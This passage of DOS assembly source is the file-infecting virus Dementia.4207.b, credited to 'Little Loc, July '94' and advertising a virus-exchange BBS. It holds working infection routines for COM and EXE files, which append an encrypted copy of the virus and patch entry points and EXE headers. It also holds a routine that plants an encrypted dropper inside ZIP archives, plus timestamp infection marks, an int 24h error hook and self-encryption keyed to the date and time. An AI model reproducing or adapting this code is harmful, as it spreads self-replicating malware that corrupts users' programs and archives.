            push    ax          ; Save AX at stack
            xor     dx,dx       ; Zero DX
            sub     dx,ax       ; DX = -number of bytes actually read
            mov     cx,-01h
            call    set_pos_cfp

            pop     ax          ; Load AX from stack
            push    ax          ; Save AX at stack

            mov     cx,ax       ; CX = number of bytes actually read
            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI
   encrypt_ipt_:
            lodsb           ; AL = byte of RECEIPT.IVA
            xor     al,0ffh         ; Encrypt byte of RECEIPT.IVA
            stosb           ; Store encrypted byte of RECEIPT.IVA
            loop    encrypt_ipt_

            pop     ax          ; Load AX from stack
            mov     cx,ax       ; CX = number of bytes actually read
            call    write_file

            jmp     encrypt_rece
   set_dta_addr:
            call    close_file

            mov     ds,[bp-26h]     ; DS = segment of disk transfer area
            mov     dx,[bp-28h]     ; DX = offset of disk transfer area
            mov     ah,1ah      ; Set disk transfer area address
            int     21h

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+40h
            mov     ds,ax       ; DS = segment of data buffer

            xor     dx,dx       ; Zero DX
            mov     ah,3bh      ; Set current directory
            int     21h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     si,receipt_iva  ; SI = offset of receipt_iva
            nop
            lea     di,filename     ; DI = offset of filename
            nop
            mov     cx,0dh      ; Move thirteen bytes
            rep     movsb       ; Move RECEIPT.IVA to filename

            jmp     open_filenam
   call_mark_:
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    infect_mark

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    close_file

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    close_file

            lea     dx,temp_file    ; DX = offset of temp_file
            nop
            call    delete_file
   inf_zip_exit:
            call    int24_load

            pop     es ds di si dx cx bx ax

            mov     sp,bp       ; SP = stack pointer

            pop     bp          ; Load BP from stack

            ret             ; Return!
            endp

   infect_com   proc    near        ; Infect COM file
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            sub     sp,04h      ; Correct stack pointer

            mov     ah,00h      ; COM executable
            nop
            nop
            mov     cs:[com_or_exe],ah  ; Store COM executable

            mov     ax,ds:[00h]     ; AX = word of original code of CO...
            mov     word ptr cs:[origin_code],ax
            mov     al,ds:[02h]     ; AL = byte of original code of CO...
            mov     cs:[origin_code+02h],al

            call    encrypt_copy

            call    set_pos_eof
            mov     [bp-04h],ax     ; Store low-order word of filesize
            mov     [bp-02h],dx     ; Store high-order word of filesize

            push    ax          ; Save AX at stack
            mov     ax,cs:[tst_filesize]
            cmp     ax,01h      ; Don't test filesize?
            pop     ax          ; Load AX from stack
            je      calc_buf_seg    ; Equal? Jump to calc_buf_seg

            cmp     dx,00h      ; Filesize too large?
            jne     inf_com_exit    ; Not equal? Jump to inf_com_exit
            cmp     ax,1000h        ; Filesize too small?
            jb      inf_com_exit    ; Below? Jump to inf_com_exit
   calc_buf_seg:
            add     ax,(code_end-code_begin)
            jb      inf_com_exit    ; Filesize too large? Jump to inf_...

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            mov     cx,10h      ; CX = number of bytes to add to f...
            mov     ax,[bp-04h]     ; AX = filesize
            and     ax,0000000000001111b
            sub     cx,ax       ; CX = number of bytes to add to f...

            mov     ax,[bp-04h]     ; AX = filesize
            add     ax,cx       ; AX = offset of virus within file
            mov     [bp-04h],ax     ; Store offset of virus within file

            call    write_file_

            mov     cx,(code_end-code_begin)
            call    write_file

            mov     al,0e9h         ; JMP imm16 (opcode 0e9h)
            mov     ds:[00h],al     ; Store JMP imm16

            mov     ax,[bp-04h]     ; AX = filesize
            sub     ax,03h      ; Subtract size of opcode JMP imm16
            mov     ds:[01h],ax     ; Store 16-bit immediate

            call    set_pos_sof

            mov     cx,03h      ; Write three bytes
            call    write_file
   inf_com_exit:
            mov     sp,bp       ; SP = stack pointer

            pop     bp          ; Load BP from stack

            ret             ; Return!
            endp

   infect_exe   proc    near        ; Infect EXE file
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            sub     sp,04h      ; Correct stack pointer

            mov     ah,01h      ; EXE executable
            nop
            nop
            mov     cs:[com_or_exe],ah  ; Store EXE executable

            call    set_pos_eof
            mov     [bp-04h],ax     ; Store low-order word of filesize
            mov     [bp-02h],dx     ; Store high-order word of filesize

            and     ax,0000000000001111b
            mov     cx,10h      ; CX = number of bytes to add to f...
            sub     cx,ax       ; CX =   "    "    "   "   "  "   "

            mov     ax,[bp-04h]     ; AX = low-order word of filesize
            mov     dx,[bp-02h]     ; DX = high-order word of filesize
            add     ax,cx       ; Add number of bytes to add to fi...
            adc     dx,00h      ; Convert to 32-bit
            mov     [bp-04h],ax     ; Store low-order word of pointer ...
            mov     [bp-02h],dx     ; Store high-order word of pointer...

            call    write_file_

            push    bx          ; Save BX at stack
            mov     ax,[bp-04h]     ; AX = low-order word of pointer t...
            mov     dx,[bp-02h]     ; DX = high-order word of pointer ...

            mov     bx,ds:[08h]     ; BX = header size in paragraphs
            mov     cl,0ch      ; Divide by four thousand and nine...
            shr     bx,cl       ; BX = header size in sixty-five t...
            sub     dx,bx       ; Subtract header size in sixty fi...

            mov     bx,ds:[08h]     ; BX = header size in paragraphs
            mov     cl,04h      ; Multiply by paragraphs
            shl     bx,cl       ; BX = header size
            sub     ax,bx       ; Subtract header size from filesize
            sbb     dx,00h      ; Convert to 32-bit
            mov     [bp-04h],ax     ; Store low-order word of pointer ...
            mov     [bp-02h],dx     ; Store high-order word of pointer...
            pop     bx          ; Load BX from stack

            mov     ax,ds:[14h]     ; AX = original instruction pointer
            mov     cs:[instruct_ptr],ax
            mov     ax,ds:[16h]     ; AX = original code segment
            mov     cs:[code_seg],ax    ; Store original code segment

            xor     ax,ax       ; Zero AX
            mov     ds:[14h],ax     ; Store initial IP
            mov     cs:[initial_ip],ax  ; Store   "     "

            mov     ax,[bp-02h]     ; AX = high-order word of pointer ...
            test    ax,1111111111110000b
            jz      calc_ins_ptr    ; Zero? Jump to calc_ins_ptr

            jmp     inf_exe_exit
   calc_ins_ptr:
            mov     cl,0ch
            shl     ax,cl       ; Multiply by sixty-five thousand ...

            mov     dx,[bp-04h]     ; DX = low-order word of pointer t...
            mov     cl,04h      ; Divide by paragraphs
            shr     dx,cl       ; DX = low-order word of pointer t...
            add     ax,dx       ; AX = initial CS relative to star...
            mov     ds:[16h],ax     ; Store initial CS relative to sta...
            mov     cs:[initial_cs],ax  ;   "      "    "     "     "    "

            push    ax          ; Save AX at stack
            mov     ax,ds:[0eh]     ; AX = initial SS relative to star...
            mov     cs:[stack_seg],ax   ; Store initial SS relative to sta...
            mov     ax,ds:[10h]     ; AX = initial SP
            mov     cs:[stack_ptr],ax   ; Store initial SP
            pop     ax          ; Load AX from stack

            add     ax,(code_end-code_begin+0fh)/10h
            jae     store_stack     ; Above or equal? Jump to store_stack

            jmp     inf_exe_exit
   store_stack:
            mov     ds:[0eh],ax     ; Store initial SS relative to sta...
            mov     ax,100h         ; AX = initial SP
            mov     ds:[10h],ax     ; Store initial SP

            push    bx          ; Save BX at stack
            mov     ax,[bp-04h]     ; AX = low-order word of pointer t...
            mov     dx,[bp-02h]     ; DX = high-order word of pointer ...

            mov     bx,ds:[08h]     ; BX = header size in paragraphs
            mov     cl,0ch      ; Divide by four thousand and nine...
            shr     bx,cl       ; BX = header size in sixty-five t...
            add     dx,bx       ; Add header size in sixty-five th...

            mov     bx,ds:[08h]     ; BX = header size in paragraphs
            mov     cl,04h      ; Multiply by paragraphs
            shl     bx,cl       ; BX = header size
            add     ax,bx       ; Add header size to filesize
            adc     dx,00h      ; Convert to 32-bit
            mov     [bp-04h],ax     ; Store low-order word of pointer ...
            mov     [bp-02h],dx     ; Store high-order word of pointer...
            pop     bx          ; Load BX from stack

            mov     ax,[bp-04h]     ; AX = low-order word of pointer t...
            mov     dx,[bp-02h]     ; DX = high-order word of pointer ...
            add     ax,(code_end-code_begin)
            adc     dx,00h      ; Convet to 32-bit

            mov     cl,07h
            shl     dx,cl       ; Multiply by one hundred and twen...

            push    ax          ; Save AX at stack
            mov     cl,09h      ; Divide by pages
            shr     ax,cl       ; AX = low-order word of pointer t...
            add     dx,ax       ; DX = number of bytes on last 512...
            pop     ax          ; Load AX from stack

            and     ax,0000000000011111b
            jz      store_pages     ; Zero? Jump to store_pages

            inc     dx          ; Increase number of bytes on last...

            jmp     store_pages_
   store_pages:
            mov     ax,200h         ; AX = total number of 512-bytes p...
   store_pages_:
            mov     ds:[02h],ax     ; Store total number of 512-bytes ...
            mov     ds:[04h],dx     ; Store number of bytes on last 51...

            mov     ax,ds:[0ch]     ; AX = maximum paragraphs to alloc...
            cmp     ax,10h      ; Maximum paragraphs to allocate ...?
            jae     store_maximu    ; Above or equal? Jump to store_ma...

            mov     ax,10h      ; AX = new maximum paragraphs to a...
   store_maximu:
            mov     ds:[0ch],ax     ; Store maximum paragraphs to allo...

            call    set_pos_sof

            mov     cx,20h      ; Write thirty-two bytes
            call    write_file

            call    set_pos_eof

            call    encrypt_copy

            mov     cx,(code_end-code_begin)
            call    write_file
   inf_exe_exit:
            mov     sp,bp       ; SP = stack pointer

            pop     bp          ; Load BP from stack

            ret             ; Return!
            endp

   encrypt_copy proc    near        ; Move virus to data buffer and en...
            push    bx          ; Save BX at stack

            mov     ah,2ch      ; Get system time
            int     21h
            mov     bx,cx       ; BX = hour and minute
            xor     bx,dx       ; BX = 16-bit random number

            mov     ah,2ah      ; Get system date
            int     21h
            xor     bx,cx       ; BX = 16-bit random number
            xor     bx,dx       ; BX = decryption key
            mov     dx,bx       ; DX =     "       "

            mov     cs:[decrypt_key],dx ; Store decryption key

            pop     bx          ; Load BX from stack

            cld             ; Clear direction flag
            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     es,ax       ; ES = segment of data buffer

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI
            mov     cx,(code_end-code_begin)
            rep     movsb       ; Move virus to data buffer

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            lea     si,crypt_begin-02h  ; SI = offset of crypt_end
            mov     di,si       ; DI =   "    "      "
            mov     cx,(crypt_begin-crypt_end-02h)/02h

            std             ; Set direction flag
   encrypt_loop:
            lodsw           ; AX = word of plain code
            xor     ax,dx       ; Encrypt word
            stosw           ; Store encrypted word

            loop    encrypt_loop

            cld             ; Clear direction flag

            ret             ; Return!
            endp

   int24_store  proc    near        ; Get and set interrupt vector 24h
            push    bx dx ds es     ; Save registers at stack

            mov     ax,3524h        ; Get interrupt vector 24h
            int     21h
            mov     word ptr cs:[int24_addr],bx
            mov     word ptr cs:[int24_addr+02h],es

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,int24_virus  ; DX = offset of int24_virus
            mov     ax,2524h        ; Set interrupt vector 24h
            int     21h

            pop     es ds dx bx     ; Load registers from stack

            ret             ; Return!
            endp

   int24_load   proc    near        ; Set interrupt vector 24h
            push    dx ds       ; Load registers from stack

            mov     dx,word ptr cs:[int24_addr]
            mov     ds,word ptr cs:[int24_addr+02h]
            mov     ax,2524h        ; Set interrupt vector 24h
            int     21h

            pop     ds dx       ; Load registers from stack

            ret             ; Return!
            endp

   int24_virus  proc    near        ; Interrupt 24h of Dementia.4207.b
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return!
            endp

   calc_crc32   proc    near        ; Calculate CRC-32 checksum
            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            add     ax,40h      ; AX = segment of CRC-32 table
            mov     es,ax       ; ES =    "    "    "      "

            xor     di,di       ; Zero DI
            xor     cx,cx       ; Zero CX
   gen_crc_tab:
            xor     dx,dx       ; Zero DX
            xor     ax,ax       ; Zero AX

            mov     al,cl       ; AL = counter
            push    cx          ; Save CX at stack
            mov     cx,08h      ; Calculate each CRC-32 table entr...
   gen_crc_loop:
            clc             ; Clear carry flag
            rcr     dx,01h      ; Rotate DX through carry one bit ...
            rcr     ax,01h      ; Rotate AX through carry one bit ...
            jnc     carry_loop      ; No carry? Jump to carry_loop

            xor     dx,0edb8h       ; DX = high-order word of CRC-32 t...
            xor     ax,8320h        ; AX = low-order word of CRC-32 ta...
   carry_loop:
            loop    gen_crc_loop

            mov     es:[di],ax      ; Store low-order word of CRC-32 t...
            mov     es:[di+02h],dx  ; Store high-order word of CRC-32 ...

            add     di,04h      ; DI = offset of next CRC-32 table...

            pop     cx          ; Load CX from stack
            inc     cx          ; Increase count register
            cmp     cx,100h         ; Generated enough CRC-32 table en...
            jne     gen_crc_tab     ; Not equal? Jump to gen_crc_tab

            call    set_pos_sof

            mov     dx,0ffffh       ; DX = high-order word of CRC-32 c...
            mov     ax,0ffffh       ; AX = low-order word of CRC-32 ch...
   read_block:
            push    ax dx       ; Save registers at stack
            mov     cx,400h         ; Read one thousand and twenty-fou...
            call    read_file
            cmp     ax,00h      ; Read all of the file?
            je      calc_crc_xit    ; Equal? Jump to calc_crc_xit

            mov     cx,ax       ; CX = number of bytes actually read

            pop     dx ax       ; Load registers from stack

            xor     si,si       ; Zero SI
   cal_crc_loop:
            push    bx cx       ; Save registers at stack
            xor     bh,bh       ; Zero BH
            mov     bl,[si]         ; BL = byte of file
            inc     si          ; Increase index register

            xor     bl,al       ; Exclusive OR (XOR) byte of file ...
            mov     cl,02h
            shl     bx,cl       ; Multiply by four
            mov     di,bx       ; DI = offset of next CRC-32 table...

            mov     al,ah       ; AL = low-order byte of low-order...
            mov     ah,dl       ; AH = high-order byte of low-orde...
            mov     dl,dh       ; DL = low-order byte of high-orde...
            xor     dh,dh       ; Zero DH

            mov     bx,es:[di]      ; BX = low-order word of CRC-32 ta...
            xor     ax,bx       ; AX = low-order word of CRC-32 ch...
            mov     bx,es:[di+02h]  ; BX = high-order word of CRC-32 t...
            xor     dx,bx       ; DX = high-order word of CRC-32 c...

            pop     cx bx       ; Load registers from stack

            loop    cal_crc_loop

            jmp     read_block
   calc_crc_xit:
            pop     dx ax       ; Load registers from stack

            xor     dx,0ffffh       ; DX = high-order word of CRC-32 c...
            xor     ax,0ffffh       ; AX = low-order word of CRC-32 ch...

            ret             ; Return!
            endp

   create_recei proc    near        ; Create RECEIPT.IVA file
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            sub     sp,12h      ; Correct stack pointer

            mov     [bp-08h],ax     ; Store number of file specifications
            mov     [bp-10h],bx     ; Store file handle of RECEIPT.IVA
            mov     [bp-02h],dx     ; Store store or don't store backs...
            mov     [bp-06h],ds     ; Store segment of file specificat...

            mov     ah,3bh      ; Set current directory

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            xor     dx,dx       ; Zero DX
            int     21h

            mov     ax,[bp-08h]     ; AX = number of file specifications
            xor     cx,cx       ; Zero CX
            mov     cl,al       ; CL = number of file specifications
            xor     dx,dx       ; Zero DX
   find_first_:
            mov     ds,[bp-06h]     ; DS = segment of file specification
            push    cx          ; Save CX at stack
            mov     cx,0000000000000111b
            call    find_first
            push    dx          ; Save DX at stack
            jnc     find_next_      ; No error? Jump to find_next_

            jmp     fnd_nxt_loop
   find_next_:
            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+48h
            mov     ds,ax       ; DS = segment of disk transfer area

            mov     dx,1eh      ; DX = offset of filename
            call    open_file
            mov     [bp-12h],ax     ; Store file handle of file within...

            mov     bx,[bp-10h]     ; BX = file handle of RECEIPT.IVA
            call    set_pos_eof

            push    ds          ; Save DS at stack
            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+44h
            mov     ds,ax       ; DS = segment of end of pathname

            mov     cx,40h      ; Write sixty-four bytes
            mov     bx,[bp-10h]     ; BX = file handle of RECEIPT.IVA
            call    write_file
            pop     ds          ; Load DS from stack

            mov     cx,0eh      ; Write fourteen bytes
            mov     dx,1eh      ; DX = offset of filename
            call    write_file_

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+4ch
            mov     ds,ax       ; DS = segment of data buffer

            mov     bx,[bp-12h]     ; BX = file handle of file within ...
            call    set_pos_eof
            mov     ds:[00h],ax     ; Store low-order word of filesize
            mov     ds:[02h],dx     ; Store high-order word of filesize

            mov     bx,[bp-10h]     ; BX = file handle of RECEIPT.IVA
            mov     cx,04h      ; Write four bytes
            call    write_file

            mov     bx,[bp-12h]     ; BX = file handle of file within ...
            call    set_pos_sof
   copy_file:
            mov     bx,[bp-12h]     ; BX = file handle of file within ...
            mov     cx,400h         ; Read one thousand and twenty-fou...
            call    read_file
            cmp     ax,00h      ; Read all of the file?
            je      call_fnd_nxt    ; Equal? Jump to call_fnd_nxt

            mov     cx,ax       ; CX = number of bytes actually read
            mov     bx,[bp-10h]     ; BX = file handle of RECEIPT.IVA
            call    write_file

            jmp     copy_file
   call_fnd_nxt:
            mov     bx,[bp-12h]     ; BX = file handle of file within ...
            call    close_file

            call    find_next
            jc      fnd_nxt_loop    ; Error? Jump to fnd_nxt_loop

            jmp     find_next_
   fnd_nxt_loop:
            pop     dx cx       ; Load registers from stack

            add     dx,0eh      ; DX = offset of next file specifi...

            dec     cx          ; Decrease count register
            cmp     cx,00h      ; No more files?
            je      copy_name       ; Equal? Jump to copy_name

            jmp     find_first_
   copy_name:
            xor     cx,cx       ; Zero CX
   find_first__:
            push    cx          ; Save CX at stack
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,file_specifi     ; DX = offset of file_specifi
            nop
            mov     cx,0000000000010111b
            call    find_first
            jc      receip_exit     ; Error? Jump to receip_exit

            pop     cx          ; Load CX from stack
            push    cx          ; Save CX at stack

            jmp     test_count
   found_dir:
            push    cx          ; Save CX at stack

            mov     cx,01h      ; Don't examine disk transfer area
   test_count:
            cmp     cx,00h      ; Examine disk transfer area?
            je      examine_dta     ; Equal? Jump to examine_dta

            call    find_next
            jc      receipt_exit    ; Error? Jump to receipt_exit

            dec     cx          ; Decrease CX

            jmp     test_count
   examine_dta:
            pop     cx          ; Load CX from stack
            inc     cx          ; Increase count register

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+44h
            mov     es,ax       ; ES = segment of end of pathname
            add     ax,04h      ; AX = segment of disk transfer area
            mov     ds,ax       ; DS =    "    "   "      "      "

            mov     si,15h      ; SI = offset of attribute of file...
            lodsb           ; AL = attribute of file found
            test    al,00010000b    ; Directory?
            je      found_dir       ; Equal? Jump to found_dir

            mov     si,1eh      ; SI = offset of filename
            lodsb           ; AL = byte of filename
            cmp     al,'.'              ; Directory?
            je      found_dir       ; Equal? Jump to found_dir

            mov     ax,[bp-02h]     ; AX = store or don't store backslash
            mov     di,ax       ; DI = offset of end of pathname
            mov     si,1eh      ; SI = offset of filename
            cmp     al,01h      ; Don't store backslash?
            je      copy_name_      ; Equal? Jump to copy_name_

            mov     al,'\'              ; AL = backslash
            stosb           ; Store backslash
   copy_name_:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            je      store_zero      ; Equal? Jump to store_zero

            stosb           ; Store byte of filename

            jmp     copy_name_
   store_zero:
            mov     dx,di       ; DX = offset of end of pathname
            xor     al,al       ; AL = zero
            stosb           ; Store zero

            mov     ax,[bp-08h]     ; AX = number of file specifications
            mov     bx,[bp-10h]     ; BX = file handle of RECEIPT.IVA
            mov     ds,[bp-06h]     ; DS = segment of file specifictions
            push    cx          ; Save CX at stack
            call    create_recei
            pop     cx          ; Load CX from stack

            mov     ah,3bh      ; Set current directory

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            xor     dx,dx       ; Zero DX

            mov     di,[bp-02h]     ; DI = offset of end of pathname
            xor     al,al       ; AL = zero
            stosb           ; Store zero

            int     21h

            jmp     find_first__
   receipt_exit:
            pop     cx          ; Load CX from stack
   receip_exit:
            mov     sp,bp       ; SP = stack pointer

            pop     bp          ; Load BP from stack

            ret             ; Return!
            endp

   open_file    proc    near        ; Open file
            mov     ax,3dffh        ; Open file
            xor     cx,cx       ; CL = attribute mask of files to ...
            int     21h
            mov     bx,ax       ; BX = file handle

            ret             ; Return!
            endp

   close_file   proc    near        ; Close file
            mov     ah,3eh      ; Close file
            int     21h

            ret             ; Return!
            endp

   find_first   proc    near        ; Find first matching file
            mov     ax,4e00h        ; Find first matching file
            int     21h

            ret             ; Return!
            endp

   find_next    proc    near        ; Find next matching file
            mov     ah,4fh      ; Find next matching file
            int     21h

            ret             ; Return!
            endp

   load_info    proc    near        ; Get file's date and time
            mov     ax,5700h        ; Get file's date and time
            int     21h
            mov     [bp-04h],cx     ; Store file time
            mov     [bp-02h],dx     ; Store file date

            ret             ; Return!
            endp

   infect_mark  proc    near        ; Infection mark
            mov     ax,5701h        ; Set file's date and time
            mov     cx,[bp-04h]     ; CX = file time
            mov     dx,[bp-02h]     ; DX = file date
            and     cx,1111111111100000b
            or      cx,0000000000000001b
            int     21h

            ret             ; Return!
            endp

   read_file    proc    near        ; Read from file
            xor     dx,dx       ; Zero DX

   read_file_   proc    near        ; Read from file
            mov     ah,3fh      ; Read from file
            int     21h

            ret             ; Return!
            endp
            endp

   create_file  proc    near        ; Create file
            mov     ah,3ch      ; Create file

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            xor     cx,cx       ; CX = file attributes
            int     21h

            ret             ; Return!
            endp

   write_file   proc    near        ; Write to file
            xor     dx,dx       ; Zero DX

   write_file_  proc    near        ; Write to file
            mov     ah,40h      ; Write to file
            int     21h

            ret             ; Return!
            endp
            endp

   set_pos_cfp  proc    near        ; Set current file position (CFP)
            mov     ax,4201h        ; Set current file position (CFP)
            int     21h

            ret             ; Return!
            endp

   set_pos_eof  proc    near        ; Set current file position (EOF)
            mov     ax,4202h        ; Set current file position (EOF)
            xor     cx,cx       ; Zero CX
            cwd             ; Zero DX
            int     21h

            ret             ; Return!
            endp

   set_pos_sof  proc    near        ; Set current file position (SOF)
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX

   set_pos_sof_ proc    near        ; Set current file position (SOF)
            mov     ax,4200h        ; Set current file position (SOF)
            int     21h

            ret             ; Return!
            endp
            endp

   delete_file  proc    near        ; Delete file
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,41h      ; Delete file
            xor     cx,cx       ; CL = attribute mask for deletion
            int     21h

            ret             ; Return!
            endp
   file_begin:
            mov     cx,(crypt_end_-crypt_begin_)/02h
            mov     si,(crypt_begin_-file_begin+100h)
            mov     di,si       ; DI = offset of crypt_begin_
            mov     dx,1995h        ; DX = decryption key

            push    cs cs       ; Save segments at stack
            pop     ds es       ; Load segments from stack (CS)
   decrypt_loo_:
            lodsw           ; AX = word of encrypted code
            xor     ax,dx       ; Decrypt two bytes
            stosw           ; Store two decrypted bytes

            jmp     decrypt_lo__
   decrypt_lo__:
            loop    decrypt_loo_
   crypt_begin_:
            mov     ax,01h      ; Set video mode
            int     10h

            mov     ax,0b800h       ; AX = segment of text video RAM
            mov     es,ax       ; ES =    "    "   "     "    "

            xor     di,di       ; Zero DI
            mov     cx,3e8h         ; Store one thousand bytes
            mov     ax,0f20h        ; Bright white background color, g...
            rep     stosw       ; Overwrite text video RAM

            xor     di,di       ; Zero DI
            mov     si,(gfx_begin-file_begin+100h)
            mov     cx,(gfx_end-gfx_begin)
   load_gfx:
            lodsb           ; AL = byte of gfx_begin
            cmp     al,0ffh         ; Write a string?
            jne     store_gfx       ; Not equal? Jump to store_gfx

            lodsb           ; AL = byte of gfx_begin
            dec     cx          ; Derease count register
            cmp     al,0ffh         ; Write a single character?
            je      store_gfx       ; Equal? Jump to store_gfx

            push    cx si ds        ; Save registers at stack
            xor     cx,cx       ; Zero CX
            mov     cl,al       ; CL = size of string
            lodsb           ; AL = byte of gfx_begin
            mov     bl,al       ; BL = low-order byte of offset of...
            lodsb           ; AL = byte of gfx_begin
            mov     bh,al       ; BH = high-order byte of offset o...
            mov     si,bx       ; SI = offset of string within gfx...

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            rep     movsb       ; Move string to text video RAM
            pop     ds si cx        ; Load registers at stack

            add     si,02h      ; Add two to index register

            sub     cx,02h      ; Subtract two from count register

            jmp     dont_sto_gfx
   store_gfx:
            stosb           ; Store a byte of gfx_begin
   dont_sto_gfx:
            loop    load_gfx

            mov     ah,01h     ; Set text-mode cursor shape
            mov     cx,2020h       ; CX = cursor start, options, botto...
            int     10h

            mov     ax,600h        ; Scroll up window (clear entire w...)
            mov     cx,1700h       ; CX = row and column of window's u...
            mov     dx,174fh       ; DX = row and column of window's l...
            mov     bh,03h     ; BH = attributes used to write bla...
            int     10h

            xor     bx,bx       ; BH = page number
            mov     dx,1600h        ; DX = row and column
            mov     ah,02h      ; Set cursor position
            int     10h

            mov     bx,05h      ; BX = attribute and page number
            mov     cx,28h      ; CX = number of times to write ch...
            mov     ax,9c4h         ; Write character and attribute at...
            push    ax bx cx        ; Save registers at stack
            int     10h

            mov     dx,1800h        ; DX = row and column
            mov     ah,02h      ; Set cursor position
            int     10h

            pop     cx bx ax        ; Load registers from stack
            int     10h

            mov     bp,27h      ; BP = length of row - 01h
   prepare_tele:
            mov     dx,1700h        ; DX = row and column
            call    set_cursor

            cmp     bp,01h      ; Beginning of row?
            jb      examine_str     ; Below? Jump to examine_str

            mov     cx,bp       ; CX = number of times to write ch...
            mov     ax,0a20h        ; Write character only at cursor p...
            int     10h

            add     dx,cx       ; Add current position in row to c...
            call    set_cursor

            mov     cx,28h      ; CX = length of row
            sub     cx,bp       ; Subtract current position in row...
            dec     bp          ; Decrease base pointer

            mov     si,(_dementia_v-file_begin+100h)

            jmp     call_teletyp
   examine_str:
            mov     cx,28h      ; CX = length of row
            inc     si          ; Increase index register

            cmp     byte ptr [si],00h   ; End of string?
            jne     call_teletyp    ; Not equal? Jump to call_teletyp

            mov     si,(_dementia_v-file_begin+100h)
   call_teletyp:
            push    si          ; Save SI at stack
            call    teletype_str
            pop     si          ; Load SI from stack

            jmp     prepare_tele

   teletype_str proc    near        ; Teletype string
            lodsb           ; AL = byte of _dementia_v
            cmp     al,00h      ; End of string?
            jne     teletype_out    ; Not equal? Jump to teletype_out

            mov     si,(_dementia_v-file_begin+100h)

            jmp     teletype_str
   teletype_out:
            mov     ah,0eh      ; Teletype output
            int     10h

            mov     ah,01h      ; Check for keystroke
            int     16h
            jnz     hot_bbs_exit    ; Keystroke available? Jump to hot...

            loop    teletype_str

            mov     cx,0fh      ; PUSH/POP/LOOP fifteen times
   loop_:
            push    cx          ; Save CX at stack
            xor     cx,cx       ; Zero CX
   loop__:
            loop    loop__

            pop     cx          ; Load CX from stack

            loop    loop_

            ret             ; Return!
            endp
   hot_bbs_exit:
            mov     ax,0c02h        ; Flush buffer and read standard i...
            int     21h

            call    cls_effect

            mov     ax,03h      ; Set video mode
            int     10h

            mov     ah,09h      ; Write string to standard output
            mov     dx,(_c__little_l-file_begin+100h)
            int     21h

            mov     ax,4c00h        ; Terminate with return code
            int     21h

   set_cursor   proc    near        ; Set cursor position
            mov     ah,02h      ; Set cursor position
            int     10h

            ret             ; Return!
            endp

   _dementia_v  db      '[Dementia v1.5b]       -= 4 Ball Cafe''=-  '
            db      '(801) PRI-VATE  ì  VX Support BBS  ì  USR Dual 28.8k  ì'
            db      '  2 nodes    -=*=-      ',00h
   _c__little_l db      '(C) Little Loc  July ''94$'
   gfx_begin    db      0ffh,1ah,00h,00h,44h,09h,65h,09h,6dh,09h,65h,09h,6eh,09h
            db      74h,09h,69h,09h,61h,09h,20h,09h,20h,09h,76h,09h,31h,09h
            db      2eh,09h,35h,09h,62h,09h,0ffh,2ah,3ah,00h,28h,09h,43h,09h
            db      29h,09h,20h,09h,4ah,09h,75h,09h,6eh,09h,65h,09h,20h,09h
            db      27h,09h,39h,09h,34h,09h,20h,09h,2dh,09h,4eh,09h,65h,09
            db      63h,09h,72h,09h,6fh,09h,73h,09h,6fh,09h,66h,09h,74h,09h
            db      0ffh,0c6h,92h,00h,0dbh,0a0h,0ffh,0eh,5ah,01h,0b0h,3bh
            db      0ffh,3fh,18h,01h,0c0h,0ffh,0ch,0bah,01h,0b1h,3bh,0b1h,3bh
            db      0b1h,3bh,0ffh,48h,6ah,01h,0b2h,3bh,0ffh,08h,02h,02h,0ffh
            db      3ah,0beh,01h,0dbh,0c0h,0ffh,0ah,0ach,01h,20h,6bh,0dch,68h
            db      20h,68h,0dch,68h,20h,68h,0b1h,3bh,0ffh,42h,0c0h,01h,20h
            db      0e0h,20h,0e0h,0bfh,68h,7eh,68h,0dah,68h,20h,68h,20h,68h
            db      0ffh,37h,0eh,02h,0e0h,0ffh,06h,0e4h,02h,20h,0a0h,0ffh,06h
            db      0ech,02h,0c0h,68h,0c4h,68h,0d9h,68h,20h,28h,0ffh,06h,0fah
            db      02h,0ffh,08h,0e4h,02h,0dbh,0e0h,0ffh,2eh,6ch,02h,0dbh,86h
            db      0dbh,86h,20h,86h,20h,0a6h,20h,0a6h,0cdh,2ah,0cbh,2ah,0cdh
            db      2ah,20h,2ah,20h,2ah,20h,0fh,0dbh,86h,0dbh,86h,0ffh,30h
            db      66h,02h,0ffh,0dh,34h,03h,86h,20h,0a6h,20h,0a6h,0bah,0ffh
            db      07h,49h,03h,0ffh,07h,38h,03h,0ffh,3bh,79h,01h,20h,0fh,20h
